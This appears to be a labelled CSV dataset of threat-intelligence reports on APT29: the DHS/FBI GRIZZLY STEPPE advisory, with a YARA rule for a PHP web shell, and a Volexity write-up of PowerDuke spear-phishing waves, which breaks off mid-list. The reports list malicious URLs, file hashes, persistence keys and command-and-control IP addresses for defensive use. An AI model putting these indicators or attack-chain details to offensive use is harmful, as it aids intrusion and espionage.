source,url,doc_id,label,text
apt29,cti-hal,7ab9965066d6,G0016,"TL P: WHI TE J O I N T AN AL Y S I S R E P O R T DISCLAIMER: This report is provided “as is” for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. DHS does not endorse any commercial product or service referenced in this advisory or otherwise. This document is distributed as TLP:WHITE: Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see https://www.us-cert.gov/tlp. Reference Number: JAR-16-20296A December 29, 2016 GRIZZLY STEPPE – Russian Malicious Cyber Activity Summary This Joint Analysis Report (JAR) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This document provides technical details regarding the tools and infrastructure used by the Russian civilian and military intelligence Services (RIS) to compromise and exploit networks and endpoints associated with the U.S. election, as well as a range of U.S. Government, political, and private sector entities. The U.S. Government is referring to this malicious cyber activity by RIS as GRIZZLY STEPPE. Previous JARs have not attributed malicious cyber activity to specific countries or threat actors. However, public attribution of these activities to RIS is supported by technical indicators from the U.S. Intelligence Community, DHS, FBI, the private sector, and other entities. This determination expands upon the Joint Statement released October 7, 2016, from the Department of Homeland Security and the Director of National Intelligence on Election Security. This activity by RIS is part of an ongoing campaign of cyber-enabled operations directed at the U.S. government and its citizens. These cyber operations have included spearphishing campaigns targeting government organizations, critical infrastructure entities, think tanks, universities, political organizations, and corporations leading to the theft of information. In foreign countries, RIS actors conducted damaging and/or disruptive cyber-attacks, including attacks on critical infrastructure networks. In some cases, RIS actors masqueraded as third parties, hiding behind false online personas designed to cause the victim to misattribute the source of the attack. This JAR provides technical indicators related to many of these operations, recommended mitigations, suggested actions to take in response to the indicators provided, and information on how to report such incidents to the U.S. Government. 1 of 13 TL P: WHI TE TL P: WHI TE Description The U.S. Government confirms that two different RIS actors participated in the intrusion into a U.S. political party. The first actor group, known as Advanced Persistent Threat (APT) 29, entered into the party’s systems in summer 2015, while the second, known as APT28, entered in spring 2016. Figure 1: The tactics and techniques used by APT29 and APT 28 to conduct cyber intrusions against target systems Both groups have historically targeted government organizations, think tanks, universities, and corporations around the world. APT29 has been observed crafting targeted spearphishing campaigns leveraging web links to a malicious dropper; once executed, the code delivers Remote Access Tools (RATs) and evades detection using a range of techniques. APT28 is known for leveraging domains that closely mimic those of targeted organizations and tricking potential victims into entering legitimate credentials. APT28 actors relied heavily on shortened URLs in their spearphishing email campaigns. Once APT28 and APT29 have access to victims, both groups exfiltrate and analyze information to gain intelligence value. These groups use this information to craft highly targeted spearphishing campaigns. These actors set up operational infrastructure to obfuscate their source infrastructure, host domains and malware for targeting organizations, establish command and control nodes, and harvest credentials and other valuable information from their targets. In summer 2015, an APT29 spearphishing campaign directed emails containing a malicious link to over 1,000 recipients, including multiple U.S. Government victims. APT29 used legitimate 2 of 13 TL P: WHI TE TL P: WHI TE domains, to include domains associated with U.S. organizations and educational institutions, to host malware and send spearphishing emails. In the course of that campaign, APT29 successfully compromised a U.S. political party. At least one targeted individual activated links to malware hosted on operational infrastructure of opened attachments containing malware. APT29 delivered malware to the political party’s systems, established persistence, escalated privileges, enumerated active directory accounts, and exfiltrated email from several accounts through encrypted connections back through operational infrastructure. In spring 2016, APT28 compromised the same political party, again via targeted spearphishing. This time, the spearphishing email tricked recipients into changing their passwords through a fake webmail domain hosted on APT28 operational infrastructure. Using the harvested credentials, APT28 was able to gain access and steal content, likely leading to the exfiltration of information from multiple senior party members. The U.S. Government assesses that information was leaked to the press and publicly disclosed. Figure 2: APT28's Use of Spearphishing and Stolen Credentials Actors likely associated with RIS are continuing to engage in spearphishing campaigns, including one launched as recently as November 2016, just days after the U.S. election. 3 of 13 TL P: WHI TE TL P: WHI TE Reported Russian Military and Civilian Intelligence Services (RIS) Alternate Names APT28 APT29 Agent.btz BlackEnergy V3 BlackEnergy2 APT CakeDuke Carberp CHOPSTICK CloudDuke CORESHELL CosmicDuke COZYBEAR COZYCAR COZYDUKE CrouchingYeti DIONIS Dragonfly Energetic Bear EVILTOSS Fancy Bear GeminiDuke GREY CLOUD HammerDuke HAMMERTOSS Havex MiniDionis MiniDuke OLDBAIT OnionDuke Operation Pawn Storm PinchDuke Powershell backdoor Quedagh Sandworm SEADADDY Seaduke SEDKIT SEDNIT Skipper Sofacy SOURFACE SYNful Knock Tiny Baron Tsar Team twain_64.dll (64-bit X-Agent implant) VmUpgradeHelper.exe (X-Tunnel implant) Waterbug X-Agent 4 of 13 TL P: WHI TE Technical Details Indicators of Compromise (IOCs) IOCs associated with RIS cyber actors are provided within the accompanying .csv and .stix files of JAR-16-20296. TL P: WHI TE Yara Signature rule PAS_TOOL_PHP_WEB_KIT { meta: description = ""PAS TOOL PHP WEB KIT FOUND"" strings: $php = ""<?php"" $base64decode = /\='base'\.\(\d+\*\d+\)\.'_de'\.'code'/ $strreplace = ""(str_replace("" $md5 = "".substr(md5(strrev("" $gzinflate = ""gzinflate"" $cookie = ""_COOKIE"" $isset = ""isset"" condition: (filesize > 20KB and filesize < 22KB) and #cookie == 2 and #isset == 3 and all of them } Actions to Take Using Indicators DHS recommends that network administrators review the IP addresses, file hashes, and Yara signature provided and add the IPs to their watchlist to determine whether malicious activity has been observed within their organizations. The review of network perimeter netflow or firewall logs will assist in determining whether your network has experienced suspicious activity. When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IPs attempting to connect to their systems. Upon reviewing the traffic from these IPs, some traffic may correspond to malicious activity, and some may correspond to legitimate activity. Some traffic that may appear legitimate is actually malicious, such as vulnerability scanning or browsing of legitimate public facing services (e.g., HTTP, HTTPS, FTP). Connections from these IPs may be performing vulnerability scans attempting to identify websites that are vulnerable to cross-site scripting (XSS) or Structured Query Language (SQL) injection attacks. If scanning identified vulnerable sites, attempts to exploit the vulnerabilities may be experienced. 5 of 13 TL P: WHI TE TL P: WHI TE Network administrators are encouraged to check their public-facing websites for the malicious file hashes. System owners are also advised to run the Yara signature on any system that is suspected to have been targeted by RIS actors. Threats from IOCs Malicious actors may use a variety of methods to interfere with information systems. Some methods of attack are listed below. Guidance provided is applicable to many other computer networks. • Injection Flaws are broad web application attack techniques that attempt to send commands to a browser, database, or other system, allowing a regular user to control behavior. The most common example is SQL injection, which subverts the relationship between a webpage and its supporting database, typically to obtain information contained inside the database. Another form is command injection, where an untrusted user is able to send commands to operating systems supporting a web application or database. See the United States Computer Emergency Readiness Team (US-CERT) Publication on SQL Injection for more information. • Cross-site scripting (XSS) vulnerabilities allow threat actors to insert and execute unauthorized code in web applications. Successful XSS attacks on websites can provide the attacker unauthorized access. For prevention and mitigation strategies against XSS, see US-CERT’s Alert on Compromised Web Servers and Web Shells. • Server vulnerabilities may be exploited to allow unauthorized access to sensitive information. An attack against a poorly configured server may allow an adversary access to critical information including any websites or databases hosted on the server. See US- CERT’s Tip on Website Security for additional information. Recommended Mitigations Commit to Cybersecurity Best Practices A commitment to good cybersecurity and best practices is critical to protecting networks and systems. Here are some questions you may want to ask your organization to help prevent and mitigate against attacks. 1. Backups: Do we backup all critical information? Are the backups stored offline? Have we tested our ability to revert to backups during an incident? 2. Risk Analysis: Have we conducted a cybersecurity risk analysis of the organization? 3. Staff Training: Have we trained staff on cybersecurity best practices? 4. Vulnerability Scanning & Patching: Have we implemented regular scans of our network and systems and appropriate patching of known system vulnerabilities? 5. Application Whitelisting: Do we allow only approved programs to run on our networks? 6. Incident Response: Do we have an incident response plan and have we practiced it? 6 of 13 TL P: WHI TE TL P: WHI TE 7. Business Continuity: Are we able to sustain business operations without access to certain systems? For how long? Have we tested this? 8. Penetration Testing: Have we attempted to hack into our own systems to test the security of our systems and our ability to defend against attacks? Top Seven Mitigation Strategies DHS encourages network administrators to implement the recommendations below, which can prevent as many as 85 percent of targeted cyber-attacks. These strategies are common sense to many, but DHS continues to see intrusions because organizations fail to use these basic measures. 1. Patch applications and operating systems – Vulnerable applications and operating systems are the targets of most attacks. Ensuring these are patched with the latest updates greatly reduces the number of exploitable entry points available to an attacker. Use best practices when updating software and patches by only downloading updates from authenticated vendor sites. 2. Application whitelisting – Whitelisting is one of the best security strategies because it allows only specified programs to run while blocking all others, including malicious software. 3. Restrict administrative privileges – Threat actors are increasingly focused on gaining control of legitimate credentials, especially those associated with highly privileged accounts. Reduce privileges to only those needed for a user’s duties. Separate administrators into privilege tiers with limited access to other tiers. 4. Network Segmentation and Segregation into Security Zones – Segment networks into logical enclaves and restrict host-to-host communications paths. This helps protect sensitive information and critical services and limits damage from network perimeter breaches. 5. Input validation – Input validation is a method of sanitizing untrusted user input provided by users of a web application, and may prevent many types of web application security flaws, such as SQLi, XSS, and command injection. 6. File Reputation – Tune Anti-Virus file reputation systems to the most aggressive setting possible; some products can limit execution to only the highest reputation files, stopping a wide range of untrustworthy code from gaining control. 7. Understanding firewalls – When anyone or anything can access your network at any time, your network is more susceptible to being attacked. Firewalls can be configured to block data from certain locations (IP whitelisting) or applications while allowing relevant and necessary data through. 7 of 13 TL P: WHI TE TL P: WHI TE Responding to Unauthorized Access to Networks Implement your security incident response and business continuity plan. It may take time for your organization’s IT professionals to isolate and remove threats to your systems and restore normal operations. Meanwhile, you should take steps to maintain your organization’s essential functions according to your business continuity plan. Organizations should maintain and regularly test backup plans, disaster recovery plans, and business continuity procedures. Contact DHS or law enforcement immediately. We encourage you to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office or the FBI’s Cyber Division (CyWatch@ic.fbi.gov or 855-292-3937) to report an intrusion and to request incident response resources or technical assistance. Detailed Mitigation Strategies Protect Against SQL Injection and Other Attacks on Web Services Routinely evaluate known and published vulnerabilities, perform software updates and technology refreshes periodically, and audit external-facing systems for known Web application vulnerabilities. Take steps to harden both Web applications and the servers hosting them to reduce the risk of network intrusion via this vector.1 • Use and configure available firewalls to block attacks. • Take steps to further secure Windows systems such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker. • Monitor and remove any unauthorized code present in any www directories. • Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) and response to these protocols as much as possible. • Remove non-required HTTP verbs from Web servers as typical Web servers and applications only require GET, POST, and HEAD. • Where possible, minimize server fingerprinting by configuring Web servers to avoid responding with banners identifying the server software and version number. • Secure both the operating system and the application. • Update and patch production servers regularly. • Disable potentially harmful SQL-stored procedure calls. • Sanitize and validate input to ensure that it is properly typed and does not contain escaped code. • Consider using type-safe stored procedures and prepared statements. • Perform regular audits of transaction logs for suspicious activity. • Perform penetration testing against Web services. • Ensure error messages are generic and do not expose too much information. 1 http://msdn.microsoft.com/en-us/library/ff648653.aspx. Web site last accessed April 11, 2016. 8 of 13 TL P: WHI TE TL P: WHI TE Phishing and Spearphishing • Implement a Sender Policy Framework (SPF) record for your organization’s Domain Name System (DNS) zone file to minimize risks relating to the receipt of spoofed messages. • Educate users to be suspicious of unsolicited phone calls, social media interactions, or email messages from individuals asking about employees or other internal information. If an unknown individual claims to be from a legitimate organization, try to verify his or her identity directly with the company. • Do not provide personal information or information about your organization, including its structure or networks, unless you are certain of a person’s authority to have the information. • Do not reveal personal or financial information in social media or email, and do not respond to solicitations for this information. This includes following links sent in email. • Pay attention to the URL of a website. Malicious websites may look identical to a • legitimate site, but the URL often includes a variation in spelling or a different domain than the valid website (e.g., .com vs. .net). If you are unsure whether an email request is legitimate, try to verify it by contacting the company directly. Do not use contact information provided on a website connected to the request; instead, check previous statements for contact information. Information about known phishing attacks is also available online from groups such as the Anti-Phishing Working Group (http://www.antiphishing.org). • Take advantage of anti-phishing features offered by your email client and web browser. • Patch all systems for critical vulnerabilities, prioritizing timely patching of software that processes Internet data, such as web browsers, browser plugins, and document readers. Permissions, Privileges, and Access Controls • Reduce privileges to only those needed for a user’s duties. • Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network. • Carefully consider the risks before granting administrative rights to users on their own machines. • Scrub and verify all administrator accounts regularly. • Configure Group Policy to restrict all users to only one login session, where possible. • Enforce secure network authentication where possible. • Instruct administrators to use non-privileged accounts for standard functions such as Web browsing or checking Web mail. 9 of 13 TL P: WHI TE TL P: WHI TE • Segment networks into logical enclaves and restrict host-to-host communication paths. Containment provided by enclaving also makes incident cleanup significantly less costly. • Configure firewalls to disallow RDP traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary VPN with lower privileges. • Audit existing firewall rules and close all ports that are not explicitly needed for business. Specifically, carefully consider which ports should be connecting outbound versus inbound. • Enforce a strict lockout policy for network users and closely monitor logs for failed login • • activity. This can be indicative of failed intrusion activity. If remote access between zones is an unavoidable business need, log and monitor these connections closely. In environments with a high risk of interception or intrusion, organizations should consider supplementing password authentication with other forms of authentication such as challenge/response or multifactor authentication using biometric or physical tokens. Credentials • Enforce a tiered administrative model with dedicated administrator workstations and separate administrative accounts that are used exclusively for each tier to prevent tools, such as Mimikatz, for credential theft from harvesting domain-level credentials. Implement multi-factor authentication (e.g., smart cards) or at minimum ensure users choose complex passwords that change regularly. • • Be aware that some services (e.g., FTP, telnet, and .rlogin) transmit user credentials in clear text. Minimize the use of these services where possible or consider more secure alternatives. • Properly secure password files by making hashed passwords more difficult to acquire. Password hashes can be cracked within seconds using freely available tools. Consider restricting access to sensitive password hashes by using a shadow password file or equivalent on UNIX systems. • Replace or modify services so that all user credentials are passed through an encrypted channel. • Avoid password policies that reduce the overall strength of credentials. Policies to avoid include lack of password expiration date, lack of lockout policy, low or disabled password complexity requirements, and password history set to zero. • Ensure that users are not re-using passwords between zones by setting policies and conducting regular audits. • Use unique passwords for local accounts for each device. 10 of 13 TL P: WHI TE TL P: WHI TE Logging Practices • Ensure event logging (applications, events, login activities, security attributes, etc.) is turned on or monitored for identification of security issues. • Configure network logs to provide enough information to assist in quickly developing an accurate determination of a security incident. • Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware-related. • Secure logs, potentially in a centralized location, and protect them from modification. • Prepare an incident response plan that can be rapidly implemented in case of a cyber intrusion. How to Enhance Your Organization’s Cybersecurity Posture DHS offers a variety of resources for organizations to help recognize and address their cybersecurity risks. Resources include discussion points, steps to start evaluating a cybersecurity program, and a list of hands-on resources available to organizations. For a list of services, visit https://www.us-cert.gov/ccubedvp. Other resources include: • The Cyber Security Advisors (CSA) program bolsters cybersecurity preparedness, risk mitigation, and incident response capabilities of critical infrastructure entities and more closely aligns them with the Federal Government. CSAs are DHS personnel assigned to districts throughout the country and territories, with at least one advisor in each of the 10 CSA regions, which mirror the Federal Emergency Management Agency regions. For more information, email cyberadvisor@hq.dhs.gov. • Cyber Resilience Review (CRR) is a no-cost, voluntary assessment to evaluate and enhance cybersecurity within critical infrastructure sectors, as well as state, local, tribal, and territorial governments. The goal of the CRR is to develop an understanding and measurement of key cybersecurity capabilities to provide meaningful indicators of an entity’s operational resilience and ability to manage cyber risk to critical services during normal operations and times of operational stress and crisis. Visit https://www.cert.org/resilience/rmm.html to learn more about the CERT Resilience Management Model. • Enhanced Cybersecurity Services (ECS) helps critical infrastructure owners and operators protect their systems by sharing sensitive and classified cyber threat information with Commercial Service Providers (CSPs) and Operational Implementers (OIs). CSPs then use the cyber threat information to protect CI customers. OIs use the threat information to protect internal networks. For more information, email ECS_Program@hq.dhs.gov. • The Cybersecurity Information Sharing and Collaboration Program (CISCP) is a voluntary information-sharing and collaboration program between and among critical 11 of 13 TL P: WHI TE TL P: WHI TE infrastructure partners and the Federal Government. For more information, email CISCP@us-cert.gov. • The Automated Indicator Sharing (AIS) initiative is a DHS effort to create a system where as soon as a company or federal agency observes an attempted compromise, the indicator will be shared in real time with all of our partners, protecting them from that particular threat. That means adversaries can only use an attack once, which increases their costs and ultimately reduces the prevalence of cyber-attacks. While AIS will not eliminate sophisticated cyber threats, it will allow companies and federal agencies to concentrate more on them by clearing away less sophisticated attacks. AIS participants connect to a DHS-managed system in the NCCIC that allows bidirectional sharing of cyber threat indicators. A server housed at each participant’s location allows each to exchange indicators with the NCCIC. Participants will not only receive DHS-developed indicators, but can share indicators they have observed in their own network defense efforts, which DHS will then share with all AIS participants. For more information, visit https://www.dhs.gov/ais. • The Cybersecurity Framework (Framework), developed by the National Institute of Standards and Technology (NIST) in collaboration with the public and private sectors, is a tool that can improve the cybersecurity readiness of entities. The Framework enables entities, regardless of size, degree of cyber risk, or cyber sophistication, to apply principles and best practices of risk management to improve the security and resiliency of critical infrastructure. The Framework provides standards, guidelines, and practices that are working effectively today. It consists of three parts—the Framework Core, the Framework Profile, and Framework Implementation Tiers—and emphasizes five functions: Identify, Protect, Detect, Respond, and Recover. Use of the Framework is strictly voluntary. For more information, visit https://www.nist.gov/cyberframework or email cyberframework@nist.gov. 12 of 13 TL P: WHI TE TL P: WHI TE Contact Information Recipients of this report are encouraged to contribute any additional information that they may have related to this threat. Include the JAR reference number (JAR-16-20296A) in the subject line of all email correspondence. For any questions related to this report, please contact NCCIC or the FBI. NCCIC: Phone: +1-888-282-0870 Email: NCCICCustomerService@hq.dhs.gov FBI: Phone: +1-855-292-3937 Email: cywatch@ic.fbi.gov Feedback NCCIC continuously strives to improve its products and services. You can help by answering a few short questions about this product at the following URL: https://www.us-cert.gov/forms/feedback. 13 of 13 TL P: WHI TE"
apt29,cti-hal,9faa299cb82e,G0016,"BLOG PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs NOVEMBER 9, 2016 by Steven Adair    In the wake of the 2016 United States Presidential Election, not even six hours after Donald Trump became the nation's President-Elect, an advanced persistent threat (APT) group launched a series of coordinated and well-planned spear phishing campaigns. Volexity observed ﬁve di!erent attack waves with a heavy focus on U.S.-based think tanks and non-governmental organizations (NGOs). These e-mails came from a mix of attacker created Google Gmail accounts and what appears to be compromised e-mail accounts at Harvard's Faculty of Arts and Sciences (FAS). These e-mails were sent in large quantities to di!erent individuals across many organizations and individuals focusing in national security, defense, international a!airs, public policy, and European and Asian studies. Two of the attacks purported to be messages forwarded on from the Clinton Foundation giving insight and perhaps a postmortem analysis into the elections. Two of the other attacks purported to be eFax links or documents pertaining to the election's outcome being revised or rigged. The last attack claimed to be a link to a PDF download on ""Why American Elections Are Flawed."" Volexity believes a group it refers to as The Dukes (also known as APT29 or Cozy Bear) is responsible for post-election attack activity. Background Since August of this year, Volexity has been actively involved in investigating and tracking several attack campaigns from the Dukes. Most notably the Dukes have previously been tied to the breach of the Democratic National Committee (DNC) and intrusions into multiple high-proﬁle United States Government organizations. In July 2015, the Dukes started heavily targeting think tanks and NGOs. This represented a fairly signiﬁcant shift in the group's previous operations and one that continued in the lead up to and immediately after the 2016 United States Presidential election. On August 10, 2016 and August 25, 2016, the Dukes launched several waves of highly targeted spear phishing attacks against several U.S.-based think tanks and NGOs. These spear phishing messages were spoofed and made to appear to have been sent from real individuals at well-known think tanks in the United States and Europe. These August waves of attacks purported to be from individuals at Transparency International, the Center for a New American Security (CNAS), the International Institute for Strategic Studies (IISS), Eurasia Group, and the Council on Foreign Relations (CFR). The Dukes are known for launching their attacks by sending links to ZIP ﬁles, that contain malicious executables, hosted on legitimate compromised web servers. However, each of the e-mail messages from the August attacks contained a Microsoft O#ce Word (.doc) or Excel (.xls) attachment. These attachments, when viewed, contained legitimate report content from each of the organizations they appeared to have been sent from. However, the attackers inserted macros into the documents designed to install a malware downloader on the system. Successful exploitation would result in the download of a PNG image ﬁle from a compromised webserver. These attack campaigns leveraged steganography in the PNG ﬁles by hiding components of a backdoor that would exist only in memory after being loaded into rundll32.exe. Volexity has dubbed this backdoor PowerDuke. Similar attack campaigns using documents with macros dropping PowerDuke were further observed through October, where Universities, and not think tanks appear to have been the primary targets. Details of these attacks have been provided to Volexity customers. Concerned NGO's and Universities that may have been targeted by these attacks campaigns are welcome to reach out for additional details. November 9 - Post-Election Spear Phishing Waves The post-election attacks launched by the Dukes on November 9 were very similar to previous attacks seen from the Dukes in both 2015 and 2016. The PowerDuke malware, ﬁrst seen in August 2016, was once again used in these most recent attacks. Three of the ﬁve attack waves contained links to download ﬁles from domains that the attackers appear to have control over. The other two attacks contained documents with malicious macros embedded within them. Each of these di!erent attack waves were slightly di!erent from one another and are detailed below. Attack Wave 1: eFax - The ""Shocking"" Truth About Election Rigging The ﬁrst attack wave is similar to much older attacks from the Dukes that purport to be an electronic Fax. This message claims to have been sent from Secure Fax Corp. and has a link to a ZIP ﬁle that contains a Microsoft shortcut ﬁle (.LNK). This shortcut ﬁle contains PowerShell commands that conduct anti-VM checks, drop a backdoor, and launch a clean decoy document. The e-mail message was sent from the attacker controlled e-mail account industry.faxsolution@gmail.com. The screen shot below shows the e- mail that was sent. The e-mail contained links pointing to the following URL: hxxp://efax.pfdweek[.]com/eFax/message0236.ZIP Inside of this password (1854) protected ZIP ﬁle is a Microsoft shortcut ﬁle named: 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk Note that pfdweek[.]com appears to be under the control of the attackers but may be a hijacked domain. Details on each of the ﬁles are included below. Filename: message0236.ZIP File size: 643843 bytes MD5 hash: bea0a6f069bd547db685698bc9f9d25a SHA1 hash: ee09bec09388338134d47fa993d5e0f86efe5bd4 Notes: Password protected ZIP ﬁle containing malicious Microsoft shortcut ﬁle (37486-the-shocking- truth-about-election-rigging-in-america.rtf.lnk) Filename: 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk File size: 724003 bytes MD5 hash: c272aebc661c54cc960ba9a4a3578952 SHA1 hash: 52d62213c66a603e33dab326bf4fa29d6ac681c4 Notes: Microsoft shortcut ﬁle with embedded PowerShell, PowerDuke backdoor (hqwhbr.lck), and clean decoy document. Filename: kxwn.lock File size: 10752 bytes MD5 hash: 28b95a2c399e60ee535c32e73860fbea SHA1 hash: bf4ce67b6e745e26fcf3a2d41938a9d!1395076 Notes: Primary PowerDuke backdoor (DLL) loader (leverages kxwn.lock:schemas) dropped to ""%APPDATA\Roaming\Microsoft\"" with persistence via HKCU Run Key ""WebCache"" (rundll32.exe %APPDATA\Roaming\Microsoft\kxwn.lock , #2). Connects directly to 173.243.80.6:443 for command and control. Filename: kxwn.lock:schemas File size: 609853 bytes MD5 hash: 4e1dec16d58ba5f4196f6a76a0bca75c SHA1 hash: a7c43d7895ecef2b6306fb00972c321060753361 Notes: Alternate data stream (ADS) PNG ﬁle with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). Attack Wave 2: eFax - Elections Outcome Could Be revised [Facts of Elections Fraud] The second attack wave that Volexity observed leveraged a Microsoft Word document with a malicious embedded macro. This appears to be consistent with several previous Dukes attack campaigns, such as those on August 25, 2016. The Macros contain several anti-VM checks designed to avoid executing in virtualized environments. The e-mail message was sent from the attacker controlled e-mail account securefaxsolution@gmail.com. The screen shot below shows the e-mail that was sent. Details on the malware components of this attack wave are included below. Filename: election-headlines-FTE2016.docm File size: 835072 bytes MD5 hash: a8e700492e113f73558131d94bc9ae2f SHA1 hash: b5684384c8028f0324ed7119f6abf379f2789970 Notes: Document containing malicious macro that drops Filename: fywhx.dll File size: 10752 bytes MD5 hash: ad6723f61e10aefd9688b29b474a9323 SHA1 hash: dd766876b3be5022bfb062f454f878abfbc670b8 Notes: PowerDuke backdoor ﬁle dropped to ""%APPDATA\Roaming\HP\"" with persistence via HKCU Run Key ""ToolboxFX"" (rundll32.exe %APPDATA\Roaming\HP\fywhx.dll #2). Connects directly to 185.132.124.43:443 for command and control. Filename: fywhx.dll:schemas File size: 608854 bytes MD5 hash: 8c53ee9137a7d540fc!0d523f7d0822 SHA1 hash: ab32c09c46e0c9dbc576fefee68e5a2f57e0482e Notes: Alternate data stream (ADS) PNG ﬁle with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). Attack Wave 3: Why American Elections Are Flawed Volexity believes the following e-mail received the widest distribution among the targeted organizations. The e-mail purports to have been sent from Harvard's ""PDF Mobile Service"" or ""PFD Mobile Service"". The spelling of this non-existent service is inconsistent in the e-mail. The latter spelling appears to be a typographical error that is consistent with the domain names registered by the attackers. The screen shot below shows the e-mail that was sent. The e-mail contained links pointing to the following URL: hxxp://efax.pfdresearch[.]org/eFax/RWP_16-038_Norris.ZIP Inside of this password (8734) protected ZIP ﬁle is an executable named: RWP16-038_Norris.exe Note that pfdresearch[.]org appears to be under the control of the attackers but may be a hijacked domain. Details on the malware components of this attack wave are included below. Filename: RWP_16-038_Norris.ZIP File size: 854996 bytes MD5 hash: 8b3050a95e3ce00424b85f6e9cc3ccec SHA1 hash: d5dcf445830c54af145c0dfeaebf28f8ec780eb5 Notes: Password protected ZIP ﬁle with malicious executable inside (RWP16-038_Norris.exe). Filename: RWP16-038_Norris.exe File size: 1144832 bytes MD5 hash: 3335f0461e5472803f4b19b706eaf4b5 SHA1 hash: 5cc807f80f14bc4a1d6036865e50d576200dfd2e Notes: Dropper for PowerDuke backdoor and clean decoy document Filename: gwV46iIc.idx File size: 10752 bytes MD5 hash: ae997d2047705!46a0c228f7b5d7052 SHA1 hash: 1067ddd5615518e0cbac7389a024b32f119a3229 Notes: Primary PowerDuke backdoor (DLL) loader (leverages gwV46iIc.idx:schemas) dropped to ""%APPDATA\Roaming\Apple\"" with persistence via HKCU Run Key ""ConnectionCenter"" (rundll32.exe %APPDATA\Roaming\Apple\gwV46iIc.idx, #2). Connects directly to 185.124.86.121:443 for command and control. Filename: gwV46iIc.idx:schemas File size: 580968 bytes MD5 hash: 7b9b51cb44cd6a7af1cd28faeeda04a7 SHA1 hash: e3bd7bdfe0026cf4ee39fd75a771eac52!ea095 Notes: Alternate data stream (ADS) PNG ﬁle with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). Attack Wave 4: Clinton Foundation FYI #1 The fourth attack wave that Volexity observed leveraged a Microsoft Word document with a malicious embedded macro. This appears to be consistent with several previous Dukes attack campaigns, such as those on August 25, 2016. The Macros contain several anti-VM checks designed to avoid executing in virtualized environments. The screen shot below shows the e-mail that was sent. Details on the malware components of this attack wave are included below. Filename: harvard-iop-fall-2016-poll.doc File size: 2808832 bytes MD5 hash: ead48f15ebc088384a4bd6190c2343fa SHA1 hash: 0b9dccfcb2cc8bced343b9d930e475f1d0e5d966 Notes: Document containing malicious macro that drops impku.dat and impku.dat:shemas. Filename: impku.dat File size: 10752 bytes MD5 hash: 9f420779c90e118a0b5fd904380878a1 SHA1 hash: 11523d859e9a818c2628d7954502cbdb5eeb2199 Notes: PowerDuke backdoor ﬁle dropped to ""%APPDATA\Roaming\Dell\"" with persistence via HKCU Run Key ""Communicator"" (rundll32.exe %APPDATA\Roaming\Dell\impku.idat, #2). Connects directly to 185.26.144.109:443 for command and control. Filename: impku.dat:schemas File size: 608854 bytes MD5 hash: b774f39d31c32da0f6a5fb5d0e6d2892 SHA1 hash: ae3!39c2a7266132e0af016a48b97d565463d90 Notes: Alternate data stream (ADS) PNG ﬁle with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). Attack Wave 5: Clinton Foundation FYI #2 The ﬁfth attack wave that Volexity observed once against leveraged a download link and a new domain that appears to be under control of the attackers. The link in the e-mail points to a ZIP ﬁle that has a Microsoft shortcut ﬁle (.LNK) inside of it. This shortcut ﬁle contains PowerShell commands that conduct anti-VM checks, drop a backdoor, and launch a clean decoy document. Like Attack Wave #3, this e-mail message also purported to be forwarded from Laura Graham at the Clinton Foundation. The message body contained dozens of e-mail addresses to which the message originally claims to have been sent, with organizations similar to Attack Wave #3. The e-mail message from this attack wave, with identifying information removed, is shown below. As seen in the screen shot above, the e-mail contained links pointing to the following URL: hxxp://efax.pfdregistry[.]net/eFax/37486.ZIP Inside of this password (6190) protected ZIP ﬁle a Microsoft Shortcut ﬁle named: 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk Note that pfdregistry[.]net appears to be under the control of the attackers but may be a hijacked domain. Details on the malware components of this attack wave are included below. Filename: 37486.ZIP File size: 580688 bytes MD5 hash: f79caf27a99c091e6c1775b306993341 SHA1 hash: a76c02c067eae26d78f4b494274dfa6aedc6fa7a Notes: Password protected ZIP ﬁle containing malicious Microsoft shortcut ﬁle 37486-the-shocking- truth-about-election-rigging-in-america.rtf.lnk. Filename: 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk File size: 661782 bytes MD5 hash: f713d5df826c6051e65f995e57d6817d SHA1 hash: 68ce4c0324f03976247!48803a7d988f9f9f43f Notes: Microsoft shortcut ﬁle with embedded PowerShell, PowerDuke backdoor (hqwhbr.lck), and clean decoy document. Filename: hqwhbr.lck File size: 10752 bytes MD5 hash: 57c627d68e156676d08bfc0829b94331 SHA1 hash: 4bcbf078a78ba0e842f78963ba9dd71240ab6a6d Notes: PowerDuke backdoor ﬁle dropped to ""%APPDATA\Roaming\Skype\"" with persistence via HKCU Run Key ""IAStorIcon"" (rundll32.exe %APPDATA\Roaming\Apple\hqwhbr.lck, #2). Connects directly to 177.10.96.30:443 for command and control. Filename: hqwhbr.lck:schemas File size: 547636 bytes MD5 hash: cbf96820dc74a50a91b2b8b94376682a SHA1 hash: 5f105801a1abb398dadc756480713f9bd7a4aa73 Notes: Alternate data stream (ADS) PNG ﬁle with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). The PowerDuke Backdoor The PowerDuke backdoor boasts a pretty extensive list of features that allow the Dukes to examine and control a system. Volexity suspects the feature set that has been built into PowerDuke is an extension of their anti-VM capabilities in the initial dropper ﬁles. Several commands supported by PowerDuke facilitate getting information about the system. A previous analysis of PowerDuke showed it supported the following commands. comp get the NetBIOS name via GetComputerNameEx domain get the computer's domain via NetWkstaGetInfo drives get logical drives, drive type, free space, serial number, etc. fsize get the size of a 